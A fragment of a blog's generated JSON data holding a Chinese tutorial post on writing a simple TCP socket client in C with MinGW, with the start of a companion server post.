alt=\"关系图\"></li>\n</ul>\n"},{"title":"C语言之socket 简易客户端","date":"2016-04-12T16:00:00.000Z","desc":"mingw socket","_content":"昨天做了一个简易服务端，今天尝试做一个简易客户端，东西比较少，很顺利就完成了。客户端socket操作步骤:1.创建socket 2.连接服务端 3.接收服务端返回数据\n# 函数\n1.连接:\nint connect(int fd, const struct sockaddr* addr, socklen_t address_len));\nfd：套接字描述符。\naddr：返回连接着的地址\naddress_len：确定address缓冲区的长度\n返回值：如果函数执行成功，返回值为0，否则为-1。\n\n2.接收\nint recv(SOCKET socket, char FAR* buf, int len, int flags);\nsocket：一个标识已连接套接口的描述字。\nbuf：用于接收数据的缓冲区。\nlen：缓冲区长度。\nflags：指定调用方式。\n返回值：若无错误发生,recv()返回读入的字节数.如果连接已中止，返回0.否则的话,返回SOCKET_ERROR错误.\n\n<!-- more -->\n# 服务端示例\n新建client.c文件\n``` C\n#define MINGW32\n \n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n \n#ifdef MINGW32\n#include <winsock2.h>\n#else\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#endif\n \n#define MAXLINE 1024\n \nint main(int argc,char **argv) \n{\n\tint sockfd,n;\n\tchar receline[MAXLINE+1];\n\tstruct sockaddr_in serveraddr;\n\n\t//输入参数太少，退出\n\tif(argc != 2) \n\t{ \n\t\tprintf(\"Usage :%s IP_address\\n\", argv[0]);\n\t\texit(0);\n\t}\n\n\t#ifdef MINGW32\n\t//Winsows下启用socket\n\tWSADATA wsadata;\n\tif(WSAStartup(MAKEWORD(1,1),&wsadata)==SOCKET_ERROR)\n\t{\n\t\tprintf(\"WSAStartup() fail\\n\");\n\t\texit(0);\n\t}\n\t#endif\n\n\t//建立socket\n\tif((sockfd=socket(AF_INET,SOCK_STREAM,0))==-1)\n\t{\n\t\tprintf(\"socket() fail\\n\");\n\t\texit(0);\n\t}\n\n\t//设置协议及Port\n\tmemset(&serveraddr,0,sizeof(serveraddr));\n\tserveraddr.sin_family = AF_INET;\n\tserveraddr.sin_port=htons(1024);\n\n\t//设置IP\n\tserveraddr.sin_addr.s_addr=inet_addr(argv[1]);\n\n\t//连接\n\tif(connect(sockfd,(struct sockaddr *)&serveraddr,sizeof(serveraddr))==-1)\n\t{\n\t\tprintf(\"connect() fail\\n\");\n\t\texit(0);\n\t}\n\n\t//读取数据并输入到标准输出\n\t#ifdef MINGW32\n\twhile((n=recv(sockfd,receline,MAXLINE,0))>0)\n\t#else\n\twhile((n=read(sockfd,receline,MAXLINE))>0)\n\t#endif\n\t{ \n\t\treceline[n]=0;\n\t\tif(fputs(receline,stdout)==EOF)\n\t\t{\n\t\t\tprintf(\"fputs() error\\r\\n\");\n\t\t}\n\t}\n\n\t//没有获取数据\n\tif(n<0) \n\t{\n\t\tprintf(\"read() fail\\n\");\n\t}\n\n\t#ifdef MINGW32\n\t//Winsows下关闭socket\n\tclosesocket(sockfd);\n\tWSACleanup();\n\t#endif\n\n\texit(0);\n}\n```\n编译:gcc -g -o client client.c -l wsock32\n执行:\n服务端 server\n客户端连接 client 127.0.0.1\n\n","source":"_posts/c-6.md","raw":"---\ntitle: C语言之socket 简易客户端\ndate: 2016-4-13\ndesc: mingw socket\n---\n昨天做了一个简易服务端，今天尝试做一个简易客户端，东西比较少，很顺利就完成了。客户端socket操作步骤:1.创建socket 2.连接服务端 3.接收服务端返回数据\n# 函数\n1.连接:\nint connect(int fd, const struct sockaddr* addr, socklen_t address_len));\nfd：套接字描述符。\naddr：返回连接着的地址\naddress_len：确定address缓冲区的长度\n返回值：如果函数执行成功，返回值为0，否则为-1。\n\n2.接收\nint recv(SOCKET socket, char FAR* buf, int len, int flags);\nsocket：一个标识已连接套接口的描述字。\nbuf：用于接收数据的缓冲区。\nlen：缓冲区长度。\nflags：指定调用方式。\n返回值：若无错误发生,recv()返回读入的字节数.如果连接已中止，返回0.否则的话,返回SOCKET_ERROR错误.\n\n<!-- more -->\n# 服务端示例\n新建client.c文件\n``` C\n#define MINGW32\n \n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n \n#ifdef MINGW32\n#include <winsock2.h>\n#else\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#endif\n \n#define MAXLINE 1024\n \nint main(int argc,char **argv) \n{\n\tint sockfd,n;\n\tchar receline[MAXLINE+1];\n\tstruct sockaddr_in serveraddr;\n\n\t//输入参数太少，退出\n\tif(argc != 2) \n\t{ \n\t\tprintf(\"Usage :%s IP_address\\n\", argv[0]);\n\t\texit(0);\n\t}\n\n\t#ifdef MINGW32\n\t//Winsows下启用socket\n\tWSADATA wsadata;\n\tif(WSAStartup(MAKEWORD(1,1),&wsadata)==SOCKET_ERROR)\n\t{\n\t\tprintf(\"WSAStartup() fail\\n\");\n\t\texit(0);\n\t}\n\t#endif\n\n\t//建立socket\n\tif((sockfd=socket(AF_INET,SOCK_STREAM,0))==-1)\n\t{\n\t\tprintf(\"socket() fail\\n\");\n\t\texit(0);\n\t}\n\n\t//设置协议及Port\n\tmemset(&serveraddr,0,sizeof(serveraddr));\n\tserveraddr.sin_family = AF_INET;\n\tserveraddr.sin_port=htons(1024);\n\n\t//设置IP\n\tserveraddr.sin_addr.s_addr=inet_addr(argv[1]);\n\n\t//连接\n\tif(connect(sockfd,(struct sockaddr *)&serveraddr,sizeof(serveraddr))==-1)\n\t{\n\t\tprintf(\"connect() fail\\n\");\n\t\texit(0);\n\t}\n\n\t//读取数据并输入到标准输出\n\t#ifdef MINGW32\n\twhile((n=recv(sockfd,receline,MAXLINE,0))>0)\n\t#else\n\twhile((n=read(sockfd,receline,MAXLINE))>0)\n\t#endif\n\t{ \n\t\treceline[n]=0;\n\t\tif(fputs(receline,stdout)==EOF)\n\t\t{\n\t\t\tprintf(\"fputs() error\\r\\n\");\n\t\t}\n\t}\n\n\t//没有获取数据\n\tif(n<0) \n\t{\n\t\tprintf(\"read() fail\\n\");\n\t}\n\n\t#ifdef MINGW32\n\t//Winsows下关闭socket\n\tclosesocket(sockfd);\n\tWSACleanup();\n\t#endif\n\n\texit(0);\n}\n```\n编译:gcc -g -o client client.c -l wsock32\n执行:\n服务端 server\n客户端连接 client 127.0.0.1\n\n","slug":"c-6","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0llsr0007g2x6jh0vlaj5","content":"<p>昨天做了一个简易服务端，今天尝试做一个简易客户端，东西比较少，很顺利就完成了。客户端socket操作步骤:1.创建socket 2.连接服务端 3.接收服务端返回数据</p>\n<h1 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h1><p>1.连接:<br>int connect(int fd, const struct sockaddr* addr, socklen_t address_len));<br>fd：套接字描述符。<br>addr：返回连接着的地址<br>address_len：确定address缓冲区的长度<br>返回值：如果函数执行成功，返回值为0，否则为-1。</p>\n<p>2.接收<br>int recv(SOCKET socket, char FAR* buf, int len, int flags);<br>socket：一个标识已连接套接口的描述字。<br>buf：用于接收数据的缓冲区。<br>len：缓冲区长度。<br>flags：指定调用方式。<br>返回值：若无错误发生,recv()返回读入的字节数.如果连接已中止，返回0.否则的话,返回SOCKET_ERROR错误.</p>\n<a id=\"more\"></a>\n<h1 id=\"服务端示例\"><a href=\"#服务端示例\" class=\"headerlink\" title=\"服务端示例\"></a>服务端示例</h1><p>新建client.c文件<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> MINGW32</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> MINGW32</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;winsock2.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">else</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/socket.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;arpa/inet.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> MAXLINE 1024</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc,<span class=\"keyword\">char</span> **argv)</span> </span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> sockfd,n;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> receline[MAXLINE+<span class=\"number\">1</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">struct</span> sockaddr_in serveraddr;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//输入参数太少，退出</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(argc != <span class=\"number\">2</span>) </span><br><span class=\"line\">\t&#123; </span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Usage :%s IP_address\\n\"</span>, argv[<span class=\"number\">0</span>]);</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> MINGW32</span></span><br><span class=\"line\">\t<span class=\"comment\">//Winsows下启用socket</span></span><br><span class=\"line\">\tWSADATA wsadata;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(WSAStartup(MAKEWORD(<span class=\"number\">1</span>,<span class=\"number\">1</span>),&amp;wsadata)==SOCKET_ERROR)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"WSAStartup() fail\\n\"</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//建立socket</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>((sockfd=socket(AF_INET,SOCK_STREAM,<span class=\"number\">0</span>))==<span class=\"number\">-1</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"socket() fail\\n\"</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//设置协议及Port</span></span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(&amp;serveraddr,<span class=\"number\">0</span>,<span class=\"keyword\">sizeof</span>(serveraddr));</span><br><span class=\"line\">\tserveraddr.sin_family = AF_INET;</span><br><span class=\"line\">\tserveraddr.sin_port=htons(<span class=\"number\">1024</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//设置IP</span></span><br><span class=\"line\">\tserveraddr.sin_addr.s_addr=inet_addr(argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//连接</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(connect(sockfd,(<span class=\"keyword\">struct</span> sockaddr *)&amp;serveraddr,<span class=\"keyword\">sizeof</span>(serveraddr))==<span class=\"number\">-1</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"connect() fail\\n\"</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//读取数据并输入到标准输出</span></span><br><span class=\"line\">\t<span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> MINGW32</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span>((n=recv(sockfd,receline,MAXLINE,<span class=\"number\">0</span>))&gt;<span class=\"number\">0</span>)</span><br><span class=\"line\">\t<span class=\"meta\">#<span class=\"meta-keyword\">else</span></span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span>((n=read(sockfd,receline,MAXLINE))&gt;<span class=\"number\">0</span>)</span><br><span class=\"line\">\t<span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">\t&#123; </span><br><span class=\"line\">\t\treceline[n]=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(<span class=\"built_in\">fputs</span>(receline,<span class=\"built_in\">stdout</span>)==EOF)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"fputs() error\\r\\n\"</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//没有获取数据</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n&lt;<span class=\"number\">0</span>) </span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"read() fail\\n\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> MINGW32</span></span><br><span class=\"line\">\t<span class=\"comment\">//Winsows下关闭socket</span></span><br><span class=\"line\">\tclosesocket(sockfd);</span><br><span class=\"line\">\tWSACleanup();</span><br><span class=\"line\">\t<span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>编译:gcc -g -o client client.c -l wsock32<br>执行:<br>服务端 server<br>客户端连接 client 127.0.0.1</p>\n","excerpt":"<p>昨天做了一个简易服务端，今天尝试做一个简易客户端，东西比较少，很顺利就完成了。客户端socket操作步骤:1.创建socket 2.连接服务端 3.接收服务端返回数据</p>\n<h1 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h1><p>1.连接:<br>int connect(int fd, const struct sockaddr* addr, socklen_t address_len));<br>fd：套接字描述符。<br>addr：返回连接着的地址<br>address_len：确定address缓冲区的长度<br>返回值：如果函数执行成功，返回值为0，否则为-1。</p>\n<p>2.接收<br>int recv(SOCKET socket, char FAR* buf, int len, int flags);<br>socket：一个标识已连接套接口的描述字。<br>buf：用于接收数据的缓冲区。<br>len：缓冲区长度。<br>flags：指定调用方式。<br>返回值：若无错误发生,recv()返回读入的字节数.如果连接已中止，返回0.否则的话,返回SOCKET_ERROR错误.</p>","more":"<h1 id=\"服务端示例\"><a href=\"#服务端示例\" class=\"headerlink\" title=\"服务端示例\"></a>服务端示例</h1><p>新建client.c文件<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> MINGW32</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> MINGW32</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;winsock2.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">else</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/socket.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;arpa/inet.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> MAXLINE 1024</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc,<span class=\"keyword\">char</span> **argv)</span> </span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> sockfd,n;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> receline[MAXLINE+<span class=\"number\">1</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">struct</span> sockaddr_in serveraddr;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//输入参数太少，退出</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(argc != <span class=\"number\">2</span>) </span><br><span class=\"line\">\t&#123; </span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Usage :%s IP_address\\n\"</span>, argv[<span class=\"number\">0</span>]);</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> MINGW32</span></span><br><span class=\"line\">\t<span class=\"comment\">//Winsows下启用socket</span></span><br><span class=\"line\">\tWSADATA wsadata;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(WSAStartup(MAKEWORD(<span class=\"number\">1</span>,<span class=\"number\">1</span>),&amp;wsadata)==SOCKET_ERROR)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"WSAStartup() fail\\n\"</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//建立socket</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>((sockfd=socket(AF_INET,SOCK_STREAM,<span class=\"number\">0</span>))==<span class=\"number\">-1</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"socket() fail\\n\"</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//设置协议及Port</span></span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(&amp;serveraddr,<span class=\"number\">0</span>,<span class=\"keyword\">sizeof</span>(serveraddr));</span><br><span class=\"line\">\tserveraddr.sin_family = AF_INET;</span><br><span class=\"line\">\tserveraddr.sin_port=htons(<span class=\"number\">1024</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//设置IP</span></span><br><span class=\"line\">\tserveraddr.sin_addr.s_addr=inet_addr(argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//连接</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(connect(sockfd,(<span class=\"keyword\">struct</span> sockaddr *)&amp;serveraddr,<span class=\"keyword\">sizeof</span>(serveraddr))==<span class=\"number\">-1</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"connect() fail\\n\"</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//读取数据并输入到标准输出</span></span><br><span class=\"line\">\t<span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> MINGW32</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span>((n=recv(sockfd,receline,MAXLINE,<span class=\"number\">0</span>))&gt;<span class=\"number\">0</span>)</span><br><span class=\"line\">\t<span class=\"meta\">#<span class=\"meta-keyword\">else</span></span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span>((n=read(sockfd,receline,MAXLINE))&gt;<span class=\"number\">0</span>)</span><br><span class=\"line\">\t<span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">\t&#123; </span><br><span class=\"line\">\t\treceline[n]=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(<span class=\"built_in\">fputs</span>(receline,<span class=\"built_in\">stdout</span>)==EOF)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"fputs() error\\r\\n\"</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//没有获取数据</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(n&lt;<span class=\"number\">0</span>) </span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"read() fail\\n\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> MINGW32</span></span><br><span class=\"line\">\t<span class=\"comment\">//Winsows下关闭socket</span></span><br><span class=\"line\">\tclosesocket(sockfd);</span><br><span class=\"line\">\tWSACleanup();</span><br><span class=\"line\">\t<span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>编译:gcc -g -o client client.c -l wsock32<br>执行:<br>服务端 server<br>客户端连接 client 127.0.0.1</p>"},{"title":"C语言之socket 简易服务端","date":"2016-04-11T16:00:00.000Z","desc":"mingw socket","_content":"今年有两个目标，一个是做开源项目，第二个是用C写一个网络服务。C写网络服务Socket是基础，首先需要了解socket的用法。服务端socket操作步骤:1.创建socket,2.绑定地址及端口,3.接收请求,4.发送数据。\n# 函数\n1.创建socket:\nint socket(int domain, int type, int protocol);\ndomain：协议域\ntype：指定Socket类型。\nprotocol：指定协议。\n返回值：如果调用成功就返回新创建的套接字的描述符，如果失败就返回-1。\n\n2.绑定地址级端口\nint bind(SOCKET socket, const struct sockaddr* address, socklen_t address_len);\n参数说明：\nsocket：是一个套接字描述符。\naddress：是一个sockaddr结构指针，该结构中包含了要结合的地址和端口号。\naddress_len：确定address缓冲区的长度。\n返回值：如果函数执行成功，返回值为0，否则为SOCKET_ERROR。\n\n3.接收连接请求\nint accept( int fd, struct socketaddr* addr, socklen_t* len);\n参数说明：\nfd：套接字描述符。\naddr：返回连接着的地址\nlen：接收返回地址的缓冲区长度\n返回值：成功返回客户端的文件描述符，失败返回-1。\n\n4.发送数据\nint send(int fd, const void * msg, int len, unsigned int falgs);\nfd：套接字描述符。\nmsg: 数据内容。\nlen: 数据长度。\n返回值：成功则返回实际传送出去的字符数, 失败返回-1.\n\n<!-- more -->\n# 服务端示例\n新建server.c文件\n``` C\n#define MINGW32\n \n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n \n#ifdef MINGW32\n#include <winsock2.h>\n#else\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#endif\n \n#define LISTENQ 10\n \nint main(int 